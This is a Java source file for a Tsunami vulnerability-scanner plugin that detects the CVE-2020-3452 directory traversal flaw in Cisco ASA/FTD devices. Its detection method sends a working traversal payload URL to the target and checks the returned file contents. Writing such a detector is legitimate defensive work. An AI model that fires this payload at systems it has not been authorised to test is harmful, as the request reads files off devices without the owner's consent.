/*
 * Copyright 2020 GovTech
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve20203452;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects CVE-2020-3452 Cisco ASA/FTD directory traversal. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE20203452",
    version = "0.1",
    description =
        "This detector checks whether the Cisco ASA/FTD Server is vulnerable to"
        + "CVE-2020-3452 directory traversal attack.",
    author = "Eugene Lim (eugene_lim@tech.gov.sg)",
    bootstrapModule = CVE20203452DetectorBootstrapModule.class)
public final class CVE20203452Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  public CVE20203452Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting CVE-2020-3452 detection.");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "+CSCOT+/translation-"
            + "table?type=mst&textdomain=/%2bCSCOE%2b/../../../../..//%2bCSCOE%2b/include"
            + "/browser_inc.lua&default-language&lang=../";
    try {
      // This is a blocking call.
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(
                  body ->
                      body.contains("Cisco Systems, Inc") && body.contains("browser_info.name"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo scannedTarget, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(scannedTarget)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOVTECH")
                        .setValue("CVE_2020_3452"))
                .setSeverity(Severity.HIGH)
                .setTitle("CVE-2020-3452")
                .setCvssV2("5.0")
                .setCvssV3("7.5")
                .setDescription("Cisco ASA/FTD Server is vulnerable to CVE-2020-3452."))
        .build();
  }
}
